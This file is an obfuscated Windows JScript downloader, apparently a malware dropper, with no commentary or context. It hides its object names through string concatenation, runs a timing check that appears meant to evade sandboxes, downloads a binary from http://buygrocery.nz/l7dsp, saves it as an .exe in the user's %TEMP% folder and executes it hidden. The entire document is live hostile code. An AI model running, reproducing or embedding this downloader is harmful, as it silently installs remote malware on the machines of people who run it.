var V1 = false;
var WU = "Create"+"Object";
var LK = function W() {return WScript[WU]("WScript"+".Shell");}(), I1 = 11;
var RA = "MSXML2"+".XMLHTTP";
var F = 2;
var X1 = F - 2;
function X0(B){LK["Run"](B, X1, X1);};
function X(){return RA + "";};
function P(MP, GE){X1 = X1 * 1; return MP - GE;};
function JC(){return WU;};
/*@cc_on
  @if (@_win32 || @_win64)
    V1 = true;
  @end
@*/
if (V1)
{
var MC = "";
function IK(){return 22;};
var N = 0; var Y = 0;
function W0()
{
var ZS = new this["Date"]();
var V0 = ZS["getUTCMilliseconds"]();
WScript["Sleep"](IK());
var ZS = new this["Date"]();
var Z = ZS["getUTCMilliseconds"]();
WScript["Sleep"](IK());
var ZS = new this["Date"]();
var O = ZS["getUTCMilliseconds"]();
var N = "C";
N = P(Z, V0);
var Y = "K";
Y = P(O, Z);
MC = "open";
return P(N, Y);
}
var Z0 = false;
var U = false;
for (var WQ = X1; WQ < IK() * 1; WQ++){if (W0() != X1){
Z0 = true; 
Y = "31" + 11 * N + Y; 
U = true; 
break;
}}
function MQ() {return ((Z0 == true) && (Z0 == U)) ? 1 : X1;};
if (Z0 && MQ() && U){
function T() {return LK["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "OPxmDM3cdKrkd.ex" + "e";};
 IB = X();
 GV = WScript[WU](IB);
 var RQ = 1;
do { 
	for (;RQ;){
	try {
		if (RQ == 1)
		{
			GV[MC]("GET", "http://buygrocery.nz/l7dsp", false);
			GV["send"]();
			I0 = "Sleep";
			RQ = 2;
		}
		WScript[I0](IK() + 120); 
		if (GV["readystate"] < 2 * 2) continue;
		RQ = X1;
		function RL(L) {var V = (1, 2, 3, 4, 5, L); return V;};
		R = WScript[JC()]("ADODB.Stream");
		IB = R;
		IB[MC]();
		IB["type"] = RL(1);
		IB["write"](GV["ResponseBody"]);
		R["position"] = RL(X1);
		IB["Save" + "ToFile"](T(), 2);
		R["cl"+"ose"]();
		I = T();
		X0(I);
	} catch(MM){};};
}while (RQ);
}
}

